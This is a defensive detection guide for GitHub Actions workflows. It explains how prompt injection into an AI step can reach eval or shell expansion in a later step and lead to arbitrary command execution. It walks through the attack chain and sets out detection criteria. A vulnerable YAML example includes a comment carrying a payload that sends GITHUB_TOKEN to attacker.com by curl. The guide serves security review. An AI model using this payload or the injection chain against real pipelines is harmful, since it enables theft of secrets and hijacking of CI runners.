# Vector G: Eval of AI Output

AI agent response is consumed by a subsequent workflow step that passes it through `eval`, `exec`, shell expansion, or other code execution sinks. If an attacker can influence the AI's output (via any prompt injection vector), the crafted response can escape the expected format and execute arbitrary shell commands. The risk is in the CONSUMING step, not the AI action itself.

## Applicable Actions

This vector applies to any AI action whose output is consumed by subsequent `run:` steps. The detection target is the CONSUMING step, not the AI action.

| Action | Applicable | Notes |
|--------|-----------|-------|
| GitHub AI Inference | Primary concern | Most commonly used with structured output parsing in subsequent steps; outputs via `steps.<id>.outputs.response` |
| Claude Code Action | Applicable if output captured | Primarily operates on codebase directly, but output can be captured in subsequent steps |
| Gemini CLI | Applicable if output captured | Primarily operates on codebase directly, but output can be captured in subsequent steps |
| OpenAI Codex | Applicable if output captured | Primarily operates on codebase directly, but output can be captured in subsequent steps |

## Trigger Events

Any event -- this vector is about how AI output is consumed, not how input reaches the AI. However, it compounds with Vectors A/B/C/E: the AI must receive attacker-controlled input to produce a malicious response.

## Data Flow

```
attacker issue -> prompt injection (via Vectors A/B/C) -> AI generates crafted response
  -> subsequent step captures ${{ steps.<ai-step>.outputs.response }}
  -> response passed through eval / exec / $() expansion
  -> arbitrary command execution
```

The AI output crosses a trust boundary: it is treated as trusted data by the subsequent step, but contains attacker-controlled content if prompt injection succeeded.

## What to Look For

1. **Steps AFTER an AI action** that reference `${{ steps.<ai-step-id>.outputs.* }}` in their `run:` block or `env:` block
2. The consuming step's `run:` block contains any of:
   - `eval` command
   - Python `exec()` or `subprocess` with string formatting from AI output
   - Backtick expansion or `$()` subshell expansion incorporating AI output
   - Unquoted variable expansion of an env var holding AI output
3. **Python/Node steps** that use `json.loads()` on AI output and then format values into a shell command (string interpolation into `subprocess.run()` or `os.system()`)
4. **`env:` blocks** that capture AI output into an env var (e.g., `AI_RESPONSE: ${{ steps.ai-inference.outputs.response }}`), which is then used in an unquoted shell expansion in `run:`

## Where to Look

Steps FOLLOWING the AI action step in the same job. Check:
- `run:` blocks for `eval`, `exec`, unquoted variable expansion, `$()`, backtick expansion
- Step-level `env:` blocks for `${{ steps.<ai-step-id>.outputs.* }}` from the AI step
- Python/Node inline scripts that combine `json.loads()` with shell command construction

## Why It Matters

Even if the AI action itself is sandboxed and restricted, the CONSUMING step may run with full permissions. The `eval` command executes arbitrary shell code within the output string. An attacker who achieves prompt injection in the AI step gains code execution in the consuming step's security context -- which typically has access to `GITHUB_TOKEN`, repository secrets, and full runner filesystem.

## Example: Vulnerable Pattern

From PoC 9 (microsoft/azure-devops-mcp) -- AI Inference output flows to `eval`:

```yaml
steps:
  - id: ai-inference
    uses: actions/ai-inference@v1
    with:
      prompt: |
        Issue Title: ${{ github.event.issue.title }}
        Issue Description: ${{ github.event.issue.body }}
        Return a JSON object with a "labels" array.

  # VULNERABLE: AI output flows to eval
  - name: Apply Labels
    env:
      AI_RESPONSE: ${{ steps.ai-inference.outputs.response }}
    run: |
      LABELS=$(echo "$AI_RESPONSE" | python3 -c "
        import sys, json
        print(' '.join([f'--add-label \"{label}\"' for label in json.load(sys.stdin)['labels']]))
      ")
      eval gh issue edit "$ISSUE_NUMBER" $LABELS
      # eval expands shell metacharacters in AI-generated label values
      # attacker crafts: {"labels": ["$(curl attacker.com/exfil?t=$GITHUB_TOKEN)"]}
```

**Data flow:** Attacker issue body contains prompt injection -> AI returns crafted JSON with shell metacharacters in label values -> Python formats labels as shell string -> `eval` executes arbitrary commands embedded in the label values.

## False Positives

- **Safe output consumption:** Steps that reference AI output but only write it to a file (`echo "$OUTPUT" > result.txt`) or post it as a comment (`gh issue comment --body "$OUTPUT"`) -- though HTML injection in comments is a separate concern
- **Validated output:** Steps that validate/sanitize AI output before using it (e.g., JSON schema validation that rejects unexpected characters or fields)
- **Read-only usage:** Steps that use AI output only for logging, metrics, or read-only display without shell interpretation
- **Condition-only usage:** AI outputs used only in `if:` conditions (e.g., `if: steps.ai.outputs.result == 'approved'`) -- limited to equality checks, not shell expansion
- **Properly quoted variables:** Steps that use `"$AI_RESPONSE"` within commands that do NOT pass through `eval` or `exec` -- normal quoting prevents word splitting but not `eval` expansion

See [foundations.md](foundations.md) for AI action field mappings and the data flow model.
